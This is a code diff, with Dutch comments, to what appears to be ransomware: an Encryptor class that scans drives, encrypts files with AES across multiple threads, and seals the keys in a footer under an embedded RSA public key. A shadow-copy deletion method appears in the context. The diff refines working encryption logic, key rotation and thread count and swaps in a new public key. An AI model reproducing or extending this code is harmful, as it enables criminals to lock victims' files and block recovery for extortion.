@@ -95,43 +95,49 @@ class Encryptor:
         files_list = deque(files_list)  # O(1) verwijderingen met deque
 
         while files_list:  # Loop zolang er bestanden zijn
-            encrypted_count += 1
+            
             filepath = files_list.popleft()  # Verwijder bestand uit deque (O(1))
+           
+            
 
             # Genereer een nieuwe sleutel elke 1000 bestanden
-            if counter >= 1000:
-                print("[LOG] Generating new AES key...")
+            if counter >= 100:
                 symenc = Symmetric_encryption()
                 symenc.generate_key()
-                footer = self.generate_footer(symenc.iv, symenc.AES_key)
+                footer = f"\n --- \n {self.generate_footer(symenc.iv, symenc.AES_key)}"
+                footer = footer.encode('utf-8')
                 counter = 1  # Reset teller
+                print("[LOG] Succesfully generated new AES key, footer...")
 
             counter += 1
             
             try:
 
                 # open file 
-                with open(filepath, 'r') as file:
+                with open(filepath, 'rb') as file:
                     data = file.read()
                 
                 # encrypt data
                 encrypted_content = symenc.encrypt_string(data)
                 
-                print(f"{filepath} encrypted successfuly" )
+                #print(f"{filepath} encrypted successfuly" )
                     
                 #open new file with .ENC enxtension
                 encrypted_filepath = filepath + '.enc'
                 
                 with open(encrypted_filepath, 'wb') as enc_file:
                     enc_file.write(encrypted_content)  # Write encrypted content and footer
+                    enc_file.write(footer)
+                    
 
-                print(f"{encrypted_filepath} new file created" )
+                #print(f"{encrypted_filepath} new file created" )
                     
 
                 #delete original file
                 #os.remove(filepath)
 
-                print(f"{encrypted_filepath} original file deleted")
+                #print(f"{encrypted_filepath} original file deleted")
+                encrypted_count += 1
             
             except Exception as e:
                 print(e)
@@ -143,7 +149,9 @@ class Encryptor:
         this function is called for everyfile and creates the footer
         """
         #load in the public key
+        
         keygen = Encryption("id:1")
+        #print("[LOG] generating footer")
         keygen.load_public_key(self.public_key)
 
         #encrypt iv
@@ -186,7 +194,9 @@ class Encryptor:
         a function which starts a thread for encrytion, it will spaw multiple threads
         """
         threads = self.determine_thread_count()
-        #threads = 40
+
+        if threads == 1:
+            threads = 2
 
         #split list by amount of threads
 
@@ -216,7 +226,7 @@ class Encryptor:
 
         end_time = time.time()
 
-        print(f"all files encrypted, time elapsed: {end_time-start_time}s")
+        print(f"[LOG] all files encrypted, time elapsed: {end_time-start_time}s")
 
 
     def delete_shadow_copies(self):
@@ -238,9 +248,9 @@ class Encryptor:
 if __name__ == "__main__":
     encrypt = Encryptor("""
 -----BEGIN RSA PUBLIC KEY-----
-MIGJAoGBAI8yZ4Q9xdMh2whC4NxfLwUbGAO5oTR3P9151g7Vq78cAWP/o2fZmzhQ
-cLRr5QmcxQYK+oOxHPA/y4WftNyp9JibQk3v2NyFRp+CVXS6Ss9cLKFaEzHXe76Q
-airp+nJl+sZa48AN+DURb5qHGn7P5qLaK2Lhfb6qpbGTDuYo2vYZAgMBAAE=
+MIGJAoGBAI96dOabn5okR7qsQUfDARJ7MVka/ZplS9kbea4Y9GtqauE5z2xdidfW
+AV7DcTOBODMlxLKIFgPhMjMfAF26rOkBCGWjY2ASiJgW1oaB79iY1cs9XvDq0v42
+CaEDN8Le4YwFF8ekF4zEg3lbfLvoOdmcu477+1aQ8XzZQ5PMZBERAgMBAAE=
 -----END RSA PUBLIC KEY-----
     """)
     encrypt.scan_drives()
